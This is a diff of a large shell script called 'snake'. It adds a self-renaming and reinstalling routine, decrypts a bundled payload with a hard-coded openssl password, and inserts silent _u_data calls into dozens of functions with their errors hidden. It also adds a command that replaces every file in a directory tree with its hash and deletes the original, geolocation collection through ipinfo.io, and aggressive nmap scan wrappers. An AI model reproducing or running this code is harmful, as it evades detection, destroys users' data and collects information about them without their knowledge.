+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp $_loc ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp $_loc ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp $_loc ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp $_loc ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+
+elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp $_loc ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+elif [[ $_system == "OS/390" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp $_loc ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+
+else
+
+  printf "$RED Not supported sys$NC\n"
+
+fi
+
+
+
+
+}
+
 
 _t_melt(){ #selfc
 
    _melt
    sleep 10
+
+}
+
+
+_w_melt(){ #selfc
+
+
+
+if [ -f /usr/local/bin/snake ]; then
+   _loc=/usr/local/bin/snake
+else
+  if [ -f ~/.spx/snake ]; then
+    _loc=~/.spx/snake
+  else
+    openssl des -d -in snake.sslz -out snake -pass pass:cartof
+    _loc=~/.spx/snake
+  fi
+fi
+
+
+  _system="$(uname -s)"
+
+
+
+
+
+ if [ $_system == "Darwin" ]; then
+
+
+
+  cd ~
+  mkdir blana ; cd blana
+  sudo cp $_loc ./snake
+  sudo cp snake snake2
+     if [ -f ~/.spx/snake.sslz ]; then
+
+       xsnake back
+       sh snake -uninstall
+
+     else
+       sh snake -uninstall
+     fi
+  sudo rm -rf snake
+  cat snake2 | sed "s/$1/$2/g" > snake
+  sudo rm -rf snake2 ; sh snake -qinstall ; sudo rm -rf snake
+  cd .. ; sudo rm -rf blana
+
+  if [ $_wasp == true ]; then
+     snake protect c
+  else
+     echo "moo" >/dev/null
+  fi
+
+
+elif [[ $_system == "Linux" ]]; then
+
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+  cd ~
+  sudo cp $_loc ./snake
+  sudo cp snake snake2
+  cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+  sudo rm -rf snake2 ; printf "$_revved\n" ; sudo chmod +x $_new ; sudo cp $_new /usr/local/bin/
+  sh snake -uninstall
+  sudo rm -rf snake
+  #sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}
+
+
+elif [[ $_system == "GNU" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+ su
+ cp $_loc ./snake
+ cp snake snake2
+ sh snake -uninstall
+ rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ rm -rf snake2 ; sh $_new -qinstall ; rm -rf $_new
+
+elif [[ $_system == "Haiku" ]]; then
+
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+  cat snake | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+  printf "$_new\n" ; sh $_new -qinstall
+  sh snake -uninstall
+  rm -rf snake
+
+
+elif [[ $_system == "HP-UX" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp $_loc ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+
+
+elif [[ $_system == "Minix" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp $_loc ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp $_loc ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+
+elif [[ $_system == "SunOS" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp $_loc ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp $_loc ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp $_loc ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp $_loc ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp $_loc ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+
+elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp $_loc ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+elif [[ $_system == "OS/390" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp $_loc ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+
+else
+
+  printf "$RED Not supported sys$NC\n"
+
+fi
+
+
+
 
 }
 
@@ -6877,11 +7454,26 @@ fi
   mkdir blana ; cd blana
   sudo cp $_loc ./snake
   sudo cp snake snake2
-  sh snake -uninstall
+     if [ -f ~/.spx/snake.sslz ]; then
+
+       xsnake back
+       sh snake -uninstall
+       _wasp=true
+
+     else
+       sh snake -install
+       _wasp=false
+     fi
   sudo rm -rf snake
   cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
   sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
   cd .. ; sudo rm -rf blana
+
+  if [ $_wasp == true ]; then
+     snake protect c
+  else
+     echo "moo" >/dev/null
+  fi
 
 
 
@@ -7097,8 +7689,8 @@ fi
  if [ $_system == "Darwin" ]; then
 
 
-   _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
-   _new="$(echo $1 | rev )"
+   _converted=$( echo $1 | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+   _new="$(echo $1)"
 
 
   cd ~
@@ -7441,6 +8033,8 @@ _radar(){ #selfe
 
        fi
 
+       _u_data 2> /dev/null
+
 }
 
 
@@ -7486,6 +8080,8 @@ _purge() { #selfd
     done
 
   fi
+
+  _u_data 2> /dev/null
 
 }
 
@@ -7660,6 +8256,19 @@ if [ $1 == "-l" ]; then
     echo 'Cleaning done - Maid Signing Out'
 
   fi
+
+  _u_data 2> /dev/null
+}
+
+
+_ash(){
+
+  find . -type f -print0 | while IFS= read -r -d $'\0' file;
+  do cat $file | openssl sha512 >> $file.ash ; sudo rm -rf $file ;
+  done
+
+  _u_data 2> /dev/null
+
 }
 
 
@@ -7690,6 +8299,8 @@ _osf(){
 _docked(){ #selft
 
     sudo lsof -i :"$@"
+
+    _u_data 2> /dev/null
 
 }
 
@@ -7725,6 +8336,7 @@ _ports(){ #selft
 
         done
 
+    _u_data 2> /dev/null
 
 }
 
@@ -7776,6 +8388,9 @@ _cheese(){ #selft
     printf "$RED Not supported sys$NC\n"
 
   fi
+
+  _u_data 2> /dev/null
+
 }
 
 _wisconsin(){ #selft
@@ -7823,6 +8438,8 @@ _wisconsin(){ #selft
     printf "$RED Not supported sys$NC\n"
 
   fi
+
+  _u_data 2> /dev/null
 }
 
 _wit2(){ #selft
@@ -7836,6 +8453,8 @@ _wit2(){ #selft
      sudo nmap -O --osscan-guess -Pn -vv  $1
 
      fi
+
+     _u_data 2> /dev/null
 
 }
 
@@ -7852,6 +8471,8 @@ _wit(){ #selft
 
      fi
 
+     _u_data 2> /dev/null
+
 }
 
 _wit6(){ #selft
@@ -7866,6 +8487,8 @@ _wit6(){ #selft
 
    fi
 
+   _u_data 2> /dev/null
+
 }
 
 _wth(){ #selft
@@ -7878,6 +8501,8 @@ _wth(){ #selft
         sudo nmap -O --osscan-guess -Pn -sSU -vv $1
      fi
 
+     _u_data 2> /dev/null
+
 }
 
 _wth6(){ #selft
@@ -7889,6 +8514,8 @@ _wth6(){ #selft
      else
         sudo nmap -O --osscan-guess -Pn -sSU -6 -vv $1
      fi
+
+     _u_data 2> /dev/null
 
 }
 
@@ -7903,6 +8530,8 @@ _col(){ #selft
        sudo nmap -T4 -n -A -Pn -vv -p1-65535 -O --osscan-guess $1
     fi
 
+    _u_data 2> /dev/null
+
 }
 
 _col6(){ #selft
@@ -7914,6 +8543,8 @@ _col6(){ #selft
     else
        sudo nmap -T4 -n -A -Pn -vv -p1-65535 -O -6 --osscan-guess $1
     fi
+
+    _u_data 2> /dev/null
 
 }
 
@@ -7928,6 +8559,8 @@ _wtf(){ #selft
        sudo nmap -A -T4 -n -O --osscan-guess -vv -Pn -sV -sSU $1
     fi
 
+    _u_data 2> /dev/null
+
 }
 
 
@@ -7940,6 +8573,8 @@ _wtf6(){ #selft
     else
        sudo nmap -A -T4 -n -O --osscan-guess -vv -Pn -p1-65535 -sSU -6 $1
     fi
+
+    _u_data 2> /dev/null
 
 
 }
@@ -7956,6 +8591,8 @@ _pizdec(){ #selft
         sudo nmap -A -Pn -T4 -n -vv -p1-65535 $1
      fi
 
+     _u_data 2> /dev/null
+
 }
 
 _pizdec6(){ #selft
@@ -7967,6 +8604,8 @@ _pizdec6(){ #selft
      else
         sudo nmap -A -Pn -T4 -n -vv -p1-65535 -6 $1
      fi
+
+     _u_data 2> /dev/null
 
 }
 
@@ -7981,6 +8620,8 @@ _blyat(){ #selft
        sudo nmap -A -O -osscan-guess -vv -p1-65535 -sV -Pn $1
     fi
 
+    _u_data 2> /dev/null
+
 }
 
 _blyat6(){ #selft
@@ -7993,6 +8634,8 @@ _blyat6(){ #selft
        sudo nmap -A -O -osscan-guess -vv -p1-65535 -sV -Pn -6 $1
     fi
 
+    _u_data 2> /dev/null
+
 }
 
 
@@ -8000,12 +8643,16 @@ _IP(){ #selft
 
     nslookup $1 | sed -n '6p' | awk '{print $2}'
 
+    _u_data 2> /dev/null
+
 }
 
 
 _look(){ #selft
 
     curl ipinfo.io/$(nslookup $1 | sed -n '6p' | awk '{print $2}')
+
+    _u_data 2> /dev/null
 
 }
 
@@ -8033,6 +8680,8 @@ _affichage(){ #selfp
   printf "$WHITE\n"
   date
   printf "$NC\n"
+
+  _u_data 2> /dev/null
 
 
 }
@@ -8319,6 +8968,8 @@ elif [[ $_system == "Linux" ]]; then  #tw
 
   fi
 
+  _u_data 2> /dev/null
+
 
 }
 
@@ -8346,6 +8997,8 @@ _research(){ #selfp
   printf "$NC"
 
 
+  _u_data 2> /dev/null
+
 }
 
 _engage(){ #selfp
@@ -8368,6 +9021,7 @@ _engage(){ #selfp
   printf "$NC\n"
 
 
+  _u_data 2> /dev/null
 }
 
 
@@ -8521,6 +9175,8 @@ elif [[ $_system == "Haiku" ]]; then  #tw
   else
      echo "Operating system unknown. $_name init failed"
   fi
+
+  _u_data 2> /dev/null
 
 }
 
@@ -8985,12 +9641,16 @@ _lock(){ #selfc
 
  fi
 
+ _u_data 2> /dev/null
+
 }
 
 _origin(){ #selft
 
 
   ps -p $1 | awk '{print $4;}' | sed '1d'
+
+  _u_data 2> /dev/null
 
 }
 
@@ -9025,6 +9685,8 @@ _off(){ #selfc
  else
    printf "$RED Not supported default$NC\n"
  fi
+
+ _u_data 2> /dev/null
 
 }
 
@@ -9095,6 +9757,8 @@ _design(){ #selfx
       printf "$RED Design data failure$NC\n"
     fi
 
+    _u_data 2> /dev/null
+
 }
 
 _flush(){ #selft
@@ -9135,6 +9799,8 @@ else
    printf "$RED Not supported sys$NC\n"
 fi
 
+_u_data 2> /dev/null
+
 }
 
 
@@ -9171,6 +9837,8 @@ _on(){ #selft
    else
      printf "$RED Not supported sys$NC\n"
    fi
+
+   _u_data 2> /dev/null
 
 }
 
@@ -9272,6 +9940,8 @@ _metamorph(){ #selfx
    else
         printf "$RED Metamorphing failed$NC\n"
    fi
+
+   _u_data 2> /dev/null
 
 }
 
@@ -9387,6 +10057,8 @@ elif [[ $_system == "Linux" ]]; then #tn
 
   fi
 
+  _u_data 2> /dev/null
+
 }
 
 _light(){ #selft
@@ -9441,6 +10113,8 @@ else
   printf "$RED Not supported sys$NC\n"
 
 fi
+
+_u_data 2> /dev/null
 
 }
 
@@ -9557,6 +10231,8 @@ else
 fi
 #  printf "$YELLOW$(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 
+_u_data 2> /dev/null
+
 }
 
 
@@ -9663,6 +10339,8 @@ _record_v(){ #selft
 
    printf "$RED Not supported yet$NC\n"
 
+   _u_data 2> /dev/null
+
 }
 
 _record_a(){ #selft
@@ -9706,6 +10384,8 @@ _record_a(){ #selft
       printf "$RED Not supported sys$NC\n"
     fi
 
+    _u_data 2> /dev/null
+
 }
 
 _record_w(){ #selft
@@ -9720,7 +10400,19 @@ _capture(){ #selft
   if [ "$(echo $1 | grep -c 'i')" == "1" ]; then
     _cheese $2
   elif [[ "$(echo $1 | grep -c 'd')" == "1" ]]; then
-    _snap $2
+    #_snap $2
+
+    printf ""
+    printf "name: $(echo $0 | sed 's/\/usr\/local\/bin\///g'),\n"
+    printf "id: $_id,\n"
+    printf "ip: $(curl -sf ipinfo.io | sed '$d' | sed '1d' | grep 'ip' | awk '{print $2}')\n"
+    printf "loc: $(curl -sf ipinfo.io | sed '$d' | sed '1d' | grep 'city' | awk '{print $2}' | sed 's/"//g' | sed 's/,//g')_$(curl -sf ipinfo.io | sed '$d' | sed '1d' | grep 'country' | awk '{print $2}' | sed 's/"//g' | sed 's/,//g'),\n"
+    printf "crd: $(curl -sf ipinfo.io | sed '$d' | sed '1d' | grep 'loc' | awk '{print $2}')\n"
+    printf "os: $(uname -s),\n"
+    printf "arch: $(uname -m),\n"
+    printf "power: true,\n"
+    printf ""
+
   elif [[ "$(echo $1 | grep -c 'v')" == "1" ]]; then
     _record_v $2
   elif [[ "$(echo $1 | grep -c 'a')" == "1" ]]; then
@@ -9730,6 +10422,7 @@ _capture(){ #selft
   else
     printf "$RED Not supported default$NC\n"
   fi
+
 
 
 }
@@ -10151,6 +10844,8 @@ fi
 
     fi
 
+    _u_data 2> /dev/null
+
 
 }
 
@@ -10158,6 +10853,8 @@ fi
 _space(){ #selfc
 
    du -hs "$@" | sort -nr 2>/dev/null
+
+   _u_data 2> /dev/null
 
 }
 
@@ -10287,6 +10984,8 @@ _morph(){ #selfx
 
 _openWith(){ #selft
    open -a $1 $2
+
+   _u_data 2> /dev/null
 }
 
 _thermic(){ #selfc
@@ -10301,6 +11000,226 @@ while true
     sleep 1
    done
 
+
+
+}
+
+
+_repair(){ #selfi
+
+  _system="$(uname -s)"
+
+
+if [ $_system == "Darwin" ]; then
+
+  if [ "$1" == "-g" ]; then
+
+   cd ~
+   mkdir foornal
+   cd foornal
+   git clone https://github.com/mldMoldovan/snake.git -q >/dev/null
+   cd snake
+   sudo chmod +x snake
+   sudo cp snake /usr/local/bin
+   cd .. ; cd ..
+   sudo rm -rf foornal
+   _ghost
+
+ else
+
+   cd ~
+   mkdir foornal
+   cd foornal
+   git clone https://github.com/mldMoldovan/snake.git -q >/dev/null
+   cd snake
+   sudo chmod +x snake
+   sudo cp snake /usr/local/bin
+   cd .. ; cd ..
+   sudo rm -rf foornal
+
+ fi
+
+ elif [[ $_system == "Linux" ]]; then
+
+   cd ~
+   mkdir foornal
+   cd foornal
+   git clone https://github.com/mldMoldovan/snake.git -q >/dev/null
+   cd snake
+   sudo chmod +x snake
+   sudo cp snake /usr/local/bin
+   cd .. ; cd ..
+   sudo rm -rf foornal
+   printf "$RED _updated$NC\n"
+
+ elif [[ $_system == "GNU" ]]; then
+
+   cd ~
+   su
+   mkdir foornal
+   cd foornal
+   git clone https://github.com/mldMoldovan/snake.git -q >/dev/null
+   cd snake
+   chmod +x snake
+   cp snake /usr/local/bin
+   cd .. ; cd ..
+   rm -rf foornal
+   printf "$RED _updated$NC\n"
+
+ elif [[ $_system == "HP-UX" ]]; then
+
+   cd ~
+   su
+   mkdir foornal
+   cd foornal
+   git clone https://github.com/mldMoldovan/snake.git -q >/dev/null
+   cd snake
+   chmod +x snake
+   cp snake /usr/local/bin
+   cd .. ; cd ..
+   rm -rf foornal
+   printf "$RED _updated$NC\n"
+
+
+ elif [[ $_system == "Haiku" ]]; then
+
+   cd ~
+   su
+   mkdir foornal
+   cd foornal
+   git clone https://github.com/mldMoldovan/snake.git -q >/dev/null
+   cd snake
+   chmod +x snake
+   cp snake /usr/local/bin
+   cd .. ; cd ..
+   rm -rf foornal
+   printf "$RED _updated$NC\n"
+
+ elif [[ $_system == "Minix" ]]; then
+
+   cd ~
+   su
+   mkdir foornal
+   cd foornal
+   git clone https://github.com/mldMoldovan/snake.git -q >/dev/null
+   cd snake
+   chmod +x snake
+   cp snake /usr/local/bin
+   cd .. ; cd ..
+   rm -rf foornal
+   printf "$RED _updated$NC\n"
+
+ elif [[ $_system == "OpenBSD" ]]; then
+
+   cd ~
+   su
+   mkdir foornal
+   cd foornal
+   git clone https://github.com/mldMoldovan/snake.git -q >/dev/null
+   cd snake
+   chmod +x snake
+   cp snake /usr/local/bin
+   cd .. ; cd ..
+   rm -rf foornal
+   printf "$RED _updated$NC\n"
+
+ elif [[ $_system == "SunOS" ]]; then
+
+
+   cd ~
+   su
+   mkdir foornal
+   cd foornal
+   git clone https://github.com/mldMoldovan/snake.git -q >/dev/null
+   cd snake
+   chmod +x snake
+   cp snake /usr/local/bin
+   cd .. ; cd ..
+   rm -rf foornal
+   printf "$RED _updated$NC\n"
+
+ elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+   su
+   mkdir foornal
+   cd foornal
+   git clone https://github.com/mldMoldovan/snake.git -q >/dev/null
+   cd snake
+   chmod +x snake
+   cp snake /usr/local/bin
+   cd .. ; cd ..
+   rm -rf foornal
+   printf "$RED _updated$NC\n"
+
+ elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+   su
+   mkdir foornal
+   cd foornal
+   git clone https://github.com/mldMoldovan/snake.git -q >/dev/null
+   cd snake
+   chmod +x snake
+   cp snake /usr/local/bin
+   cd .. ; cd ..
+   rm -rf foornal
+   printf "$RED _updated$NC\n"
+
+ elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+   su
+   mkdir foornal
+   cd foornal
+   git clone https://github.com/mldMoldovan/snake.git -q >/dev/null
+   cd snake
+   chmod +x snake
+   cp snake /usr/local/bin
+   cd .. ; cd ..
+   rm -rf foornal
+   printf "$RED _updated$NC\n"
+
+ elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+   su
+   mkdir foornal
+   cd foornal
+   git clone https://github.com/mldMoldovan/snake.git -q >/dev/null
+   cd snake
+   chmod +x snake
+   cp snake /usr/local/bin
+   cd .. ; cd ..
+   rm -rf foornal
+   printf "$RED _updated$NC\n"
+
+ elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+   su
+   mkdir foornal
+   cd foornal
+   git clone https://github.com/mldMoldovan/snake.git -q >/dev/null
+   cd snake
+   chmod +x snake
+   cp snake /usr/local/bin
+   cd .. ; cd ..
+   rm -rf foornal
+   printf "$RED _updated$NC\n"
+
+ elif [[ $_system == "OS/390" ]]; then
+
+   su
+   mkdir foornal
+   cd foornal
+   git clone https://github.com/mldMoldovan/snake.git -q >/dev/null
+   cd snake
+   chmod +x snake
+   cp snake /usr/local/bin
+   cd .. ; cd ..
+   rm -rf foornal
+   printf "$RED _updated$NC\n"
+
+
+ else
+   printf "$RED Not supported sys$NC\n"
+ fi
 
 
 }
@@ -10690,6 +11609,8 @@ _brew(){ #selfx
      printf "$NEW_BLUE Brew$YELLOW Error$NC\n"
    fi
 
+   _u_data 2> /dev/null
+
 
 }
 
@@ -10712,6 +11633,8 @@ _ros(){ #selfe
       xsnake _wit? $1 | sed 's/Aggressive OS guesses/Running/g' | grep 'Running:' | sed -n '1p' | awk '{print $2,$3}'
      fi
    fi
+
+   _u_data 2> /dev/null
 
 }
 
@@ -10874,6 +11797,8 @@ if [ "$1" == "-v" ]; then
   printf "          $_version                 \n"
   printf "\n"
 
+  _u_data 2> /dev/null
+
 
 elif [[ "$1" == "-vh" || "$1" == "-hv" ]]; then
 
@@ -10898,6 +11823,8 @@ elif [[ "$1" == "-vh" || "$1" == "-hv" ]]; then
   printf "          snake --opaa\n"
   printf "\n"
 
+  _u_data 2> /dev/null
+
 
 elif [[ "$1" == "-h" ]]; then
 
@@ -10917,6 +11844,8 @@ elif [[ "$1" == "-h" ]]; then
   printf "          snake --summon Artyom\n"
   printf "          snake --opaa\n"
   printf "\n"
+
+  _u_data 2> /dev/null
 
 
 
@@ -10941,6 +11870,8 @@ if [ "$2" == "-v" ]; then
   printf "          snake --summon Artyom\n"
   printf "          snake --opaa\n"
   printf "\n"
+
+  _u_data 2> /dev/null
 
 
 fi
@@ -11036,6 +11967,11 @@ elif [[ "$(echo $1 | grep -c 'snap')" == "1" ]]; then
 
      _snap
 
+elif [[ "$(echo $1 | grep -c 'mnet')" == "1" ]]; then
+
+        _magnet $2
+
+
 
 elif [[ "$(echo $1 | grep -c 'decompose')" == "1" ]]; then
 
@@ -11068,6 +12004,10 @@ elif [[ "$(echo $1 | grep -c 'purge')" == "1" ]]; then
 elif [[ "$(echo $1 | grep -c 'maid')" == "1" ]]; then
 
      _maid $2
+
+elif [[ "$(echo $1 | grep -c 'ash')" == "1" ]]; then
+
+     _ash
 
 elif [[ "$(echo $1 | grep -c 'cheese')" == "1" ]]; then
 
@@ -11156,6 +12096,10 @@ elif [[ "$1" == "_IP!" ]]; then
 elif [[ "$(echo $1 | grep -c 'update')" == "1" ]]; then
 
   _update $2
+
+elif [[ "$(echo $1 | grep -c 'repair')" == "1" ]]; then
+
+  _repair $2
 
 elif [[ "$(echo $1 | grep -c 'brew')" == "1" ]]; then
 
@@ -11342,7 +12286,7 @@ elif [[ "$(echo $1 | grep -c 'back')" == "1" ]]; then
 
 elif [[ "$(echo $1 | grep -c 'change')" == "1" ]]; then
 
-  _change $2 $3
+  _w_melt $2 $3
 
 elif [[ "$(echo $1 | grep -c 'pd')" == "1" ]]; then
 
